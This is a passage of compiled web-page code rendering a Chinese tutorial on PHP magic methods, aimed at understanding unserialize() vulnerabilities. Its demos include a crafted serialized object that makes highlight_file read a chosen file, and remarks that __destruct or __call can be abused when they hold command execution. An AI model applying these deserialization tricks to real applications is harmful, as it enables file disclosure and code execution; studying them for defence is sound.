",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'1.php'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," \n\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__destruct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{")," \n            ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"destruct执行<br>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\n            ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"highlight_file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token boolean constant"}),"true"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," \n        ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}")," \n         \n\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__wakeup"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{")," \n            ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"wakeup执行<br>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n            ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'1.php'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," \n        ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}")," \n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$data")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),'\'O:5:"Ameng":2:{s:4:"name";s:5:"2.php";}\''),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"unserialize"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$data"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"执行结果："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830153532.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"__sleep"},"__sleep()",Object(p.b)("a",c({parentName:"h3"},{href:"#__sleep","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"__sleep()"),"函数刚好与",Object(p.b)("inlineCode",{parentName:"p"},"__waeup()"),"相反，前者是在序列化一个对象时被调用，后者是在反序列化时被调用。那么该如何利用呢？我们看看代码。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"header"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Content-Type: text/html; charset=utf-8"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{")," \n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'1.php'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," \n\t\t\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__construct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t\t\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__sleep"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"sleep()执行<br>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"highlight_file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token boolean constant"}),"true"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t\t\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__destruct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"over<br>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t\t\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__wakeup"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{")," \n            ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"wakeup执行<br>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"         \n        ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}")," \n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"2.php"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"serialize"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"执行结果："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830161758.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"__destruct"},"__destruct()",Object(p.b)("a",c({parentName:"h3"},{href:"#__destruct","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个函数的作用其实在上面的例子中已经显示了，就是在对象被销毁时调用，倘若这个函数中有命令执行之类的功能，我们完全可以利用这一点来进行漏洞的利用，得到自己想要的结果。"),Object(p.b)("h3",{className:"__internal",id:"__construct"},"__construct()",Object(p.b)("a",c({parentName:"h3"},{href:"#__construct","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个函数的作用在",Object(p.b)("inlineCode",{parentName:"p"},"__sleep()"),"也是体现了的，这个函数就是在一个对象被创建时会调用这个函数，比如我在",Object(p.b)("inlineCode",{parentName:"p"},"__sleep()"),"中用这个函数来对变量进行赋值。"),Object(p.b)("h3",{className:"__internal",id:"__call"},"__call()",Object(p.b)("a",c({parentName:"h3"},{href:"#__call","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数用来监视一个对象中的其他方法。当你尝试调用一个对象中不存在的或者被权限控制的方法，那么",Object(p.b)("inlineCode",{parentName:"p"},"__call"),"就会被自动调用"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"header"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Content-Type: text/html; charset=utf-8"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"  \n\t\t\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__call"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$args"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"call执行失败"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t\t\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"static")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__callStatic"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$args"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"callStatic执行失败"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\tAmeng",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),":"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),":"),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"执行结果："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830164518.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"__callstatic"},"__callStatic()",Object(p.b)("a",c({parentName:"h3"},{href:"#__callstatic","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个方法是 PHP5.3 增加的新方法。主要是调用不可见的静态方法时会自动调用。具体使用在上面代码示例和结果可见。那么这两个函数有什么值得我们关注的呢？想一想，倘若这两个函数中有命令执行的函数，那么我们调用对象中不存在方法时就可以调用这两个函数，这不就达到我们想要的目的了。                                                                                     "),Object(p.b)("h3",{className:"__internal",id:"__get"},"__get()",Object(p.b)("a",c({parentName:"h3"},{href:"#__get","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"一般来说，我们总是把类的属性定义为private。但有时候我们对属性的读取和赋值是非常频繁，这个时候PHP就提供了两个函数来获取和赋值类中的属性。"),Object(p.b)("p",null,"get方法用来获取私有成员属性的值。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//__get()方法用来获取私有属性"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"__get"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}")))),Object(p.b)("h4",{className:"__internal",id:"参数-29"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-29","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"$name：要获取成员属性的名称。")),Object(p.b)("h3",{className:"__internal",id:"__set"},"__set()",Object(p.b)("a",c({parentName:"h3"},{href:"#__set","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此方法用来给私有成员属性赋值。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//__set()方法用来设置私有属性"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"__set"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$value"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$name")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$value"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}")))),Object(p.b)("h4",{className:"__internal",id:"参数-30"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-30","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"$name：要赋值的属性名。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"$value：给属性赋值的值。")),Object(p.b)("h3",{className:"__internal",id:"__isset"},"__isset()",Object(p.b)("a",c({parentName:"h3"},{href:"#__isset","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个函数是当我们对不可访问属性调用",Object(p.b)("inlineCode",{parentName:"p"},"isset()"),"或者",Object(p.b)("inlineCode",{parentName:"p"},"empty()"),"时调用。"),Object(p.b)("p",null,"在这之前我们要先了解一下",Object(p.b)("inlineCode",{parentName:"p"},"isset()"),"函数的使用。",Object(p.b)("inlineCode",{parentName:"p"},"isset()"),"函数检测某个变量是否被设置了。所以这个时候问题就来了，如果我们使用这个函数去检测对象里面的成员是否设定，那么会发生什么呢？"),Object(p.b)("p",null,"若对象的成员是公有成员，那没什么问题。倘若对象的成员是私有成员，那这个函数就不行了，人家根本就不允许你访问，你咋能检测人家是否设定了呢？那我们该怎么办？这个时候我们可以在类里面加上",Object(p.b)("inlineCode",{parentName:"p"},"__isset()"),"方法，接下来就可以使用",Object(p.b)("inlineCode",{parentName:"p"},"isset()"),"在对象外面访问对象里面的私有成员了。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"header"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Content-Type: text/html; charset=utf-8"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"  \n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"private")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__construct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t\t\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__isset"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$content"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"当在类外面调用isset方法时，那么我就会执行！"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"isset"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$content"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ameng")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Ameng"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"isset"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"执行结果："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830173037.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"__unset"},"__unset()",Object(p.b)("a",c({parentName:"h3"},{href:"#__unset","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个方法基本和",Object(p.b)("inlineCode",{parentName:"p"},"__insset"),"情况一致，都是在类外访问类内私有成员时要调用这个函数，基本调用的方法和上面一致。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter 